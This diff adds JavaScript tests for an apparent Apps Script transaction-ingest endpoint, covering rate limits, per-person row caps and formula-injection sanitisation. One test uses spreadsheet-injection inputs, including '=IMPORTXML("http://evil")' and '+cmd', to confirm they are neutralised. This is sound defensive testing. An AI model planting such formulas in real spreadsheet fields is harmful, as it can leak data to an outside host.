@@ -93,3 +93,31 @@ console.log("\n--- 5. Switching a friend off deletes the key ---");
   const fresh = w.act("friend", { action: "getMyIngestKey" }).key;
   assert(fresh && fresh !== key, "switching her back on gives a NEW key");
 }
+
+console.log("\n--- 6. Cheap abuse limits and safe text ---");
+{
+  const store = {};
+  sb.CacheService = { getScriptCache: function(){ return { get: function(k){ return Object.prototype.hasOwnProperty.call(store, k) ? store[k] : null; }, put: function(k, v){ store[k] = String(v); }, remove: function(k){ delete store[k]; } }; } };
+  const k2 = w.act("friend", { action: "getMyIngestKey" }).key;
+  const reads = [];
+  const origGet = sb.fsGetPathMeta_;
+  sb.fsGetPathMeta_ = function(p){ reads.push(p); return origGet(p); };
+  for(let i = 0; i < 30; i++) send("z".repeat(64));
+  const readsAfterBad = reads.length;
+  const refused = send(k2, { tx: tx({ reference: "777001" }), sms: "Rs.1 debited to A" });
+  assert(refused.ok === false && /too many/i.test(refused.error), "after 30 wrong keys in a minute, even a request is refused");
+  assert(reads.length === readsAfterBad, "and it is refused WITHOUT reading the database again");
+  sb.fsGetPathMeta_ = origGet;
+  delete store.ING_BAD;
+  // formulas
+  const f = send(k2, { tx: tx({ reference: "777002", counterparty: "=IMPORTXML(\"http://evil\")", bank: "+cmd" }), sms: "@SUM(1) Rs.2 debited" });
+  const row = w.virtualTab(FRIEND, "Transactions").pop();
+  assert(f.saved === true && row[7].indexOf("'=") === 0 && row[2].indexOf("'+") === 0 && row[10].indexOf("'@") === 0, "text starting with = + - @ is stored with a ' in front, so it can never run as a formula");
+  const again = send(k2, { tx: tx({ reference: "777003" }), sms: "@SUM(1) Rs.2 debited" });
+  assert(again.duplicate === true, "the duplicate check still works on that cleaned text");
+  // per-person cap
+  for(let i = 0; i < 120; i++) send(k2, { tx: tx({ reference: "88" + i, amount: 1 }), sms: "Rs.1 debited to Shop " + i });
+  const count = w.virtualTab(FRIEND, "Transactions").length;
+  const over = send(k2, { tx: tx({ reference: "990001" }), sms: "one more message" });
+  assert(over.ok === false && /too many/i.test(over.error), "one person cannot add endless rows (cap per 6 hours)");
+}
